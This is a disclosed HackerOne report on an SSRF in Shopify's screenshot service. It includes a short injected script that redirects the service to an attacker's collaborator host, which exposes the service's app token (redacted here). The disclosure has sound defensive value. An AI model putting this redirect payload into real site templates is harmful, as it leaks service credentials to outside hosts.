---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '1067443'
original_report_id: '1067443'
title: Screenshot Service leaks X-ABS-App-Token
weakness: Server-Side Request Forgery (SSRF)
team_handle: shopify
created_at: '2020-12-28T13:13:15.568Z'
disclosed_at: '2021-02-12T12:44:23.524Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 13
asset_identifier: Other
asset_type: OTHER
max_severity: none
tags:
- hackerone
- server-side-request-forgery-ssrf
---

# Screenshot Service leaks X-ABS-App-Token

## Metadata

- HackerOne Report ID: 1067443
- Weakness: Server-Side Request Forgery (SSRF)
- Program: shopify
- Disclosed At: 2021-02-12T12:44:23.524Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

1. Login and create a development store
2. Start Burp Suite and open a burp collaborator client then copy the collaborator payload
3. Edit the section header.liquid of your current theme. Adding this:

````
<script>
  window.location="https://[paste_here_collaborator]/";
</script>

````
Finally go to https://your-store.myshopify.com/admin/themes , in your collaborator client you should be able to read the server request

## Impact

This SSRF expose `X-ABS-App-Token: screenshot-service-production@████████` . 
Fortunately when you load another location than the preview page of your shop the screenshot isn't taken but can open the door to another vulnerabilities.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
